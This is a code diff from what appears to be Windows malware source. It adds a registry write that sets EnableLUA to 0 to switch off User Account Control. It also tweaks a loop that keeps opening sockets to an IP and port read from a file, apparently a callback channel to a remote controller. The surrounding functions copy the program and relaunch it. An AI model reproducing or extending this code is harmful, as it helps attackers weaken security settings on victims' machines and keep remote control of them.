@@ -82,10 +82,18 @@ static void defect(void)
 
 		RegCloseKey(hKey);
 
+		DWORD number = 0x00000000;
+		lnRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
+		// if the program is started without admin, lnRes will not be ERROR_SUCCESS.
+		if(ERROR_SUCCESS == lnRes)
+		{
+			lnRes = RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (unsigned char *)&number, sizeof(DWORD));
+		}
+
+		RegCloseKey(hKey);
+
 		sprintf(command, "/c start %s\\%s", targetPath, srcPathwithName + i + 1);
 		onlyRunCommand(command);
-
-		//TODO: Disable UAC to run again
 
 		exit(0);
 	}
@@ -95,7 +103,7 @@ static void lifeOnSystem(void)
 {
 	char * al;
 	SOCKET sckt;
-	int de, check = 0;
+	int de, check = 0, yes = 1;
 	struct sockaddr_in veriler;
 
 	readIpPortFromFile();
@@ -103,11 +111,12 @@ static void lifeOnSystem(void)
 	while (1)
 	{
 		sckt = socket(AF_INET, SOCK_STREAM, 0);
+		setsockopt(sckt, SOL_SOCKET, SO_REUSEADDR, (char * )&yes, sizeof(int));
 
 		veriler.sin_family = AF_INET;
 		veriler.sin_port = htons(port);
 		veriler.sin_addr.s_addr = inet_addr(ip);
-		memset(&(veriler.sin_zero), 0, 8);
+		memset(veriler.sin_zero, 0, 8);
 
 		if (sckt != INVALID_SOCKET && sckt != SOCKET_ERROR)
 		{
